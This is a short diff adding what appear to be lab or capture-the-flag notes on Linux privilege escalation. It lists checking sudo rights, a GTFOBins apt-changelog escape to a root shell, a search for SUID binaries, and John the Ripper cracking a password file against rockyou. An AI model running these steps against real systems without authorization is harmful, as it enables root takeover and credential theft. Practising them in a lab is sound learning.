@@ -1,0 +1,14 @@
+sudo -l
+
+GTFO bins
+
+apt get
+
+sudo apt get changelog apt
+
+
+find / -type f -perm /4000 -ls 2>/dev/null
+
+john passwords.txt --wordlist=rockyou.txt
+
+john passwords.txt --show
